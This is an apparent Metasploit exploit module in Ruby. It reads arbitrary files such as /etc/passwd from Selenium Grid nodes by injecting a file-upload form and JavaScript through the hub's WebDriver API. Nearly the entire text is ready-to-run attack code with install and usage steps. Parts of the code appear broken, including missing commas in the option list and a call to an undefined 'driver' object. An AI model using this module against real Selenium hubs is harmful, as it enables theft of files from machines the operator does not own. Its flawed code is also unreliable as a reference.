# Exploit Title: Selenium Node Download
# Date: 3/7/2021
# Exploit Author: Jon Statton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: 3.141.59 + Firefox(geckodriver)

# I think the download and upload of files on a Selenium Node should be turned off by default on the Hub level. It should be something that has to be turned on explicitly, maybe with some type of authorization.

# DESCRIPTION: This creates and inline HTML form with a file upload field and some java script that base64 encodes the uploaded file into a variable. A file is uploaded with “send_keys”, and this variable is then dumped and decoded in Ruby. This was tested with Geckodriver/Firefox, but should work with all browsers that have a Webdriver.

# INSTALL: To install copy this to "~/.msf4/modules/exploits/multi/http/" or whatever.

# RUN: Set "URL" to the HUB URL (Should look like http://selenium-hub.lan:4444/wd/hub). Set "REMOTE_FILE" to the path and name of file on the NODE (example: /tmp/blah.txt). Set "LOCAL_FILE" to the path and name to save the remote file too. If this isnt set, the remote file's contents will be dumped to stdout.

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Download',
      'Description'    => %q{
        This creates and inline HTML form with a file upload field and some java script that base64 encodes the uploaded file into a variable. A file is uploaded with “send_keys”, and this variable is then dumped and decoded in Ruby. This was tested with Geckodriver/Firefox, but should work with all browsers that have a Webdriver.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [
        [
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Selenium Hub URL. http://selenium-hub.lan:4444/wd/hub']),
        OptString.new('REMOTE_FILE', [true, 'The Remote File to Download', '/etc/passwd'])
        OptString.new('LOCAL_FILE', [false, 'Save the remote file to this name and path. If not set, the REMOTE_FILE will be dumped to stdout.'])
        OptString.new('BROWSER', [false, 'The BrowserName to use.', 'firefox'])
      ])
  end

  def exploit
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']
    browser = datastore['BROWSER']

    #driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:desiredCapabilities => {:browserName => browser}})
    })
    sessionId = res.get_json_document["value"]["sessionId"] ? res.get_json_document["value"]["sessionId"] : res.get_json_document["sessionId"]

    #driver.get('data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => 'data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>'})
    })

    #driver.find_element(id: 'f').send_keys(remote_file)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:using => 'css selector', :value => '#f'})
    })
    elementId = res.get_json_document["value"].values[0]

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element', elementId, 'value'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:text => remote_file, :value => remote_file.split()})
    })

    # js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'execute', 'sync'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:args => [], :script => "return(inf)"})
    })
    decoded_contents = Base64.decode64(res.get_json_document["value"].split(',')[1])

    if local_file
      File.open(local_file, 'wb') do |f|
        f.write(decoded_contents)
      end
    else
      print(decoded_contents)
    end

    driver.quit
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId)
    })
  end

end
